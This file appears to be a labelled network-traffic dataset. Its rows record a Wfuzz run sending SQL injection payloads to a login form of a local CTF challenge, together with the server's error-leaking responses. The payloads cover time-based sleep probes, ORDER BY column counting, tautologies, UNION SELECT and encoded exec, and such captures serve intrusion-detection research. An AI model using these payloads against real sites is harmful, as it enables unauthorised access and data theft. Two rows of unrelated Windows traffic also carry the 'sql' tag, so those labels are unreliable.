attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port,res_header_Connection,req_header_Connection
sql,192.168.1.39,80,"username="")) or sleep(__TIME__)=""&password=admin123&submit=submit",*/*,65.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56436,,
sql,192.168.1.39,80,username=1)) or sleep(__TIME__)#&password=admin123&submit=submit,*/*,64.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56437,,
sql,192.168.1.39,80,"username="") or sleep(__TIME__)=""&password=admin123&submit=submit",*/*,64.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56439,,
sql,192.168.1.39,80,username=1 or sleep(__TIME__)#&password=admin123&submit=submit,*/*,62.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56440,,
sql,192.168.1.39,80,"username=and (select substring(@@version,3,1))='c'&password=admin123&submit=submit",*/*,82.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'c'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,571.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56447,,
sql,192.168.1.39,80,username=ORDER BY 31337#&password=admin123&submit=submit,*/*,56.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56450,,
sql,192.168.1.39,80,"username=and (select substring(@@version,3,1))='X'&password=admin123&submit=submit",*/*,82.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'X'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,571.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56443,,
sql,192.168.1.39,80,username=ORDER BY 29#&password=admin123&submit=submit,*/*,53.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56444,,
sql,192.168.1.39,80,username=ORDER BY 25#&password=admin123&submit=submit,*/*,53.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56445,,
sql,192.168.1.39,80,username=ORDER BY 26#&password=admin123&submit=submit,*/*,53.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56446,,
sql,192.168.1.39,80,username=ORDER BY 23#&password=admin123&submit=submit,*/*,53.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56448,,
sql,192.168.1.39,80,username=ORDER BY 2&password=admin123&submit=submit,*/*,51.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56449,,
sql,192.168.1.39,80,"username=and (select substring(@@version,2,1))='y'&password=admin123&submit=submit",*/*,82.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'y'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,571.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56451,,
sql,192.168.1.39,80,"username=and (select substring(@@version,3,1))='S'&password=admin123&submit=submit",*/*,82.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'S'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,571.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56452,,
sql,192.168.1.39,80,username=declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)&password=admin123&submit=submit,*/*,142.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56455,,
sql,192.168.1.39,80,username=x' OR full_name LIKE '%Bob%&password=admin123&submit=submit,*/*,68.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'full_name' in 'where clause' in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,424.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56456,,
sql,192.168.1.39,80,username=29%&password=admin123&submit=submit,*/*,44.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56457,,
sql,192.168.1.39,80,username=26%&password=admin123&submit=submit,*/*,44.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56458,,
sql,192.168.1.39,80,username=//*&password=admin123&submit=submit,*/*,44.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56459,,
sql,192.168.1.39,80,username=' or 3=3 --&password=admin123&submit=submit,*/*,52.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,551.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56460,,
sql,192.168.1.39,80,username=1;SELECT%20*&password=admin123&submit=submit,*/*,53.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56461,,
sql,192.168.1.39,80,username='%20or%201=1&password=admin123&submit=submit,*/*,53.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,569.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56462,,
sql,192.168.1.39,80,username=' or 3=3&password=admin123&submit=submit,*/*,49.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,569.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56463,,
sql,192.168.1.39,80,username='sqlattempt1&password=admin123&submit=submit,*/*,53.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sqlattempt1' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,580.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56464,,
sql,192.168.1.39,80,username=or SLEEP(5)&password=admin123&submit=submit,*/*,52.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56477,,
sql,192.168.1.39,80,username=or SLEEP(5)--&password=admin123&submit=submit,*/*,54.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56468,,
sql,192.168.1.39,80,"username=SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/&password=admin123&submit=submit",*/*,89.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56469,,
sql,192.168.1.39,80,username=pg_SLEEP(5)#&password=admin123&submit=submit,*/*,53.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56470,,
sql,192.168.1.39,80,username=' or sleep(5)#&password=admin123&submit=submit,*/*,55.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56471,,
sql,192.168.1.39,80,"username=benchmark(50000000,MD5(1))&password=admin123&submit=submit",*/*,67.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56472,,
sql,192.168.1.39,80,username=waitfor delay '00:00:05'#&password=admin123&submit=submit,*/*,66.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '00:00:05'#' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,579.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56473,,
sql,192.168.1.39,80,username=or SLEEP(5)='&password=admin123&submit=submit,*/*,54.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,551.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56474,,
sql,192.168.1.39,80,username=waitfor delay '00:00:05'--&password=admin123&submit=submit,*/*,67.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '00:00:05'--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,580.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56475,,
sql,192.168.1.39,80,"username=or SLEEP(5)=""&password=admin123&submit=submit",*/*,54.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",341.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56476,,
sql,23.47.106.6,80,,*/*,,,x1.c.lencr.org,Microsoft-CryptoAPI/10.0,GET,http://x1.c.lencr.org/,,,application/pkix-crl,"Mon, 30 Jan 2023 23:29:49 GMT",304,,192.168.1.34,56480,keep-alive,Keep-Alive
sql,13.107.4.50,80,,*/*,,,ctldl.windowsupdate.com,Microsoft-CryptoAPI/10.0,GET,http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?a298783fe0cb9110,,,application/vnd.ms-cab-compressed,"Mon, 30 Jan 2023 23:29:49 GMT",304,Microsoft-IIS/10.0,192.168.1.34,56481,,Keep-Alive
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#&password=admin123&submit=submit",*/*,139.0,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",622.0,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56487,,
